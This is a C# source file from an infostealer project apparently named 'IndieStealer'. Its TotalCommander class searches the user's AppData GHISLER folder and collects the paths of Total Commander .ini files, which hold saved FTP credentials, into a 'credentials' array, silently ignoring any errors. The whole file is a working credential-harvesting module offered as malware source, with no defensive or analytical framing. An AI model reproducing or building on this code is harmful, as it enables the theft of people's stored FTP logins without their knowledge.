using System;
using System.IO;
using System.Linq;

namespace IndieStealer.Collect.FTP
{
    public class TotalCommander
    {
        private static string TotalCommanderDir = Info.Appdata + "\\GHISLER\\";
        public static string[] credentials { get; set; }

        public static void Collect()
        {
            try
            {
                if (!Directory.Exists(TotalCommanderDir))
                    return;
                string[] files = Directory.GetFiles(TotalCommanderDir);
                if (files.Length < 1)
                    return;
                credentials = new string[files.Length];
                for (int i = 0,n = 0; i < files.Length; i++)
                {
                    if (files[i].EndsWith(".ini"))
                        credentials[n++] = files[i];
                }
                credentials = credentials.Where(x => !string.IsNullOrEmpty(x)).ToArray();
            }
            catch (Exception exception)
            { }
            
        }
    }
}